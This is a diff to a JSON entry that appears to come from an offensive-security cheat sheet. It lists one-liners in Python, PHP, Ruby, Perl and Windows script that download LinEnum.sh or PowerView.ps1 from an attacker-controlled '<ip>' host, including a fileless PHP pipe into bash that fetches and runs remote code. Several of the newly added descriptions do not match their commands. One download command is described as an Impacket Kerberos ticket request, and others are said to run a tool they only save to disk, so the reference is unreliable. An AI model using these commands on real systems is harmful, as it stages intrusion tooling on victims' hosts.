@@ -67,23 +67,28 @@
   "variations": [
     {
       "label": "Python 3 / 2",
-      "command": "python3 -c 'import urllib.request;urllib.request.urlretrieve(\"https://<ip>/LinEnum.sh\",\"LinEnum.sh\")'\npython2.7 -c 'import urllib;urllib.urlretrieve(\"https://<ip>/LinEnum.sh\",\"LinEnum.sh\")'"
+      "command": "python3 -c 'import urllib.request;urllib.request.urlretrieve(\"https://<ip>/LinEnum.sh\",\"LinEnum.sh\")'\npython2.7 -c 'import urllib;urllib.urlretrieve(\"https://<ip>/LinEnum.sh\",\"LinEnum.sh\")'",
+      "description": "Runs an automated privilege escalation enumeration tool. Checks for common misconfigurations and privesc vectors."
     },
     {
       "label": "PHP (file_get_contents / fopen)",
-      "command": "php -r '$file = file_get_contents(\"https://<ip>/LinEnum.sh\"); file_put_contents(\"LinEnum.sh\",$file);'"
+      "command": "php -r '$file = file_get_contents(\"https://<ip>/LinEnum.sh\"); file_put_contents(\"LinEnum.sh\",$file);'",
+      "description": "Runs an automated privilege escalation enumeration tool. Checks for common misconfigurations and privesc vectors."
     },
     {
       "label": "PHP fileless pipe",
-      "command": "php -r '$lines = @file(\"https://<ip>/LinEnum.sh\"); foreach ($lines as $l){ echo $l; }' | bash"
+      "command": "php -r '$lines = @file(\"https://<ip>/LinEnum.sh\"); foreach ($lines as $l){ echo $l; }' | bash",
+      "description": "Runs an automated privilege escalation enumeration tool. Checks for common misconfigurations and privesc vectors."
     },
     {
       "label": "Ruby / Perl",
-      "command": "ruby -e 'require \"net/http\"; File.write(\"LinEnum.sh\", Net::HTTP.get(URI.parse(\"https://<ip>/LinEnum.sh\")))'\nperl -e 'use LWP::Simple; getstore(\"https://<ip>/LinEnum.sh\", \"LinEnum.sh\");'"
+      "command": "ruby -e 'require \"net/http\"; File.write(\"LinEnum.sh\", Net::HTTP.get(URI.parse(\"https://<ip>/LinEnum.sh\")))'\nperl -e 'use LWP::Simple; getstore(\"https://<ip>/LinEnum.sh\", \"LinEnum.sh\");'",
+      "description": "Uses Impacket getST to request a Kerberos Service Ticket (TGS) for a specific SPN. Used in constrained delegation attacks, S4U abuse, and service ticket manipulation."
     },
     {
       "label": "Windows JScript / VBScript",
-      "command": "cscript.exe /nologo wget.js https://<ip>/PowerView.ps1 PowerView.ps1\ncscript.exe /nologo wget.vbs https://<ip>/PowerView.ps1 PowerView2.ps1"
+      "command": "cscript.exe /nologo wget.js https://<ip>/PowerView.ps1 PowerView.ps1\ncscript.exe /nologo wget.vbs https://<ip>/PowerView.ps1 PowerView2.ps1",
+      "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
     }
   ],
   "opsec": "quiet",
